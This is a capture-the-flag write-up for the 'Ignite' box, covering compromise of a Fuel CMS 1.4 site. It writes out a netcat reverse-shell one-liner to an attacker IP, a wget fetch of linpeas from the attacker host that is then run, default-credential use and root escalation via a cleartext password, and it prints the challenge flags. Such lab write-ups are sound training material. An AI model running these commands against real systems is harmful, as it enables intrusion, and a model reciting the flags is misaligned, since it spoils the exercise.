# Ignite - Easy

```shell
nmap -T4 -p- -A -v 10.10.158.62

#using RCE exploit from Exploit-DB
#setup listener
nc -nvlp 4444
#we get reverse shell

python -c 'import pty;pty.spawn("/bin/bash")'

ls /home

ls -la /home/www-data
#get user flag

cd /tmp

#get linpeas from attacker machine server
wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#use cleartext password found
su root
#it works

cat /root/root.txt
```

* Open ports & services:

  * 80 - http - Apache httpd 2.4.18 (Ubuntu)

* We have the webpage for Fuel CMS (v1.4) - it is unchanged since its setup.

* Scrolling down, we can see that we have creds admin:admin for /fuel

* Logging into /fuel, we are faced with a dashboard for Fuel CMS.

* We can search for Fuel CMS 1.4 exploits - we get RCE exploits.

* Using an RCE exploit from Exploit-DB, we can get reverse shell with the help of this one-liner:

    ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.31.212 4444 >/tmp/f```

* We can use linpeas to check for privesc.

* We get a password left in cleartext in a config file - mememe.

* When we try this password for root, we get root shell.

```markdown
1. user.txt - 6470e394cbf6dab6a91682cc8585059b

2. root.txt - b9bbcb33e11b80be759c4e844862482d
```
